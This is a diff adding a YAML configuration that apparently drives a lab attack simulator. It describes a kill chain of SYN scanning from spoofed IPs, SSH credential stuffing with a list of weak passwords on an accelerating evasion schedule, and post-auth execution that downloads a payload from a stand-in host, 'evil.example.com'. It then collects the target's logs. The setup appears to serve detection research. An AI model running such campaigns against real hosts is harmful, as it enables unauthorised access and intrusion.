@@ -1,0 +1,144 @@
+campaign:
+  name: "Full Kill Chain — Recon → Credential Stuffing → Post-Auth"
+  description: >
+    Three-phase attack campaign simulating a complete kill chain:
+    (1) SYN scan reconnaissance to identify open ports,
+    (2) credential stuffing with breach dump credentials,
+    (3) post-auth command execution with system profiling and payload download.
+    Each phase uses distinct timing profiles. The full chain covers 6 MITRE
+    ATT&CK tactics: Reconnaissance, Credential Access, Initial Access,
+    Execution, Discovery, and Command and Control.
+  seed: 42
+
+  target:
+    host: 192.168.2.201
+    ssh_user: researcher
+    ssh_key: ~/.ssh/isildur_research
+    ssh_port: 22
+
+  phases:
+    # Phase 1: Network reconnaissance via SYN scanning
+    - name: "Network Reconnaissance"
+      module: recon
+      mitre_technique: "T1046"
+      mitre_tactic: "TA0043"
+      attack_type: discovery
+      attack_stage: recon
+      severity: 1
+      params:
+        ports: [22, 80, 443, 8080, 3306, 5432]
+        scan_type: syn
+      ip_source:
+        strategy: spoofed
+        count: 500
+        subnet: "10.0.0.0/8"
+      timing:
+        duration_seconds: 120
+        profile: constant
+        jitter_ms: [50, 300]
+        delay_after_seconds: 30
+
+    # Phase 2: Credential stuffing with breach dump pairs
+    - name: "Credential Stuffing"
+      module: credential_stuffing
+      mitre_technique: "T1110.004"
+      mitre_tactic: "TA0006"
+      attack_type: credential_stuffing
+      attack_stage: initial_access
+      severity: 2
+      params:
+        credentials:
+          - ["admin", "admin123"]
+          - ["root", "toor"]
+          - ["john.smith", "Summer2024!"]
+          - ["jdoe", "password1"]
+          - ["maria.garcia", "Welcome1"]
+          - ["bob.jones", "qwerty123"]
+          - ["alice", "iloveyou"]
+          - ["charlie", "dragon2024"]
+          - ["dave", "monkey123"]
+          - ["eve", "trustno1"]
+          - ["frank", "baseball1"]
+          - ["grace", "shadow2024"]
+          - ["henry", "sunshine1"]
+          - ["iris", "princess1"]
+          - ["jack", "letmein99"]
+          - ["karen", "welcome99"]
+          - ["leo", "football1"]
+          - ["maya", "abc12345"]
+          - ["nick", "master123"]
+          - ["olivia", "access2024"]
+        target_port: 22
+        max_attempts_per_ip: 100
+      ip_source:
+        strategy: aliased
+        count: 5
+        subnet: "192.168.2.0/24"
+        start_offset: 130
+        interface: en0
+      timing:
+        duration_seconds: 300
+        profile: accelerating
+        delay_after_seconds: 60
+        profile_params:
+          phases:
+            - label: cautious
+              fraction: 0.3
+              jitter_ms: [2000, 5000]
+            - label: probing
+              fraction: 0.4
+              jitter_ms: [500, 1500]
+            - label: aggressive
+              fraction: 0.3
+              jitter_ms: [100, 400]
+
+    # Phase 3: Post-auth execution with payload download
+    - name: "Post-Auth Execution"
+      module: ssh_post_auth
+      mitre_technique: "T1059.004"
+      mitre_tactic: "TA0002"
+      attack_type: execution
+      attack_stage: execution
+      severity: 3
+      params:
+        username: researcher
+        password: "pass123"
+        command_profile: full_recon
+        download_url: "http://evil.example.com/payload"
+        target_port: 22
+        inter_command_delay_ms: [1000, 5000]
+      ip_source:
+        strategy: aliased
+        count: 3
+        subnet: "192.168.2.0/24"
+        start_offset: 140
+        interface: en0
+      timing:
+        duration_seconds: 300
+        profile: constant
+        jitter_ms: [3000, 8000]
+        delay_after_seconds: 30
+
+  collection:
+    log_sources:
+      - name: auth_log
+        parser: auth_log
+        remote_path: /var/log/auth.log
+      - name: syslog
+        parser: syslog
+        remote_path: /var/log/syslog
+      - name: web_access
+        parser: web_access
+        remote_path: /var/log/nginx/access.log
+      - name: web_error
+        parser: web_error
+        remote_path: /var/log/nginx/error.log
+      - name: journal
+        parser: journal
+        remote_command: "journalctl --since '1 hour ago' -o json"
+      - name: auditd
+        parser: auditd
+        remote_command: "sudo -n ausearch -k research_exploit --raw"
+    output:
+      db_path: data/campaigns.db
+      time_buffer_seconds: 60
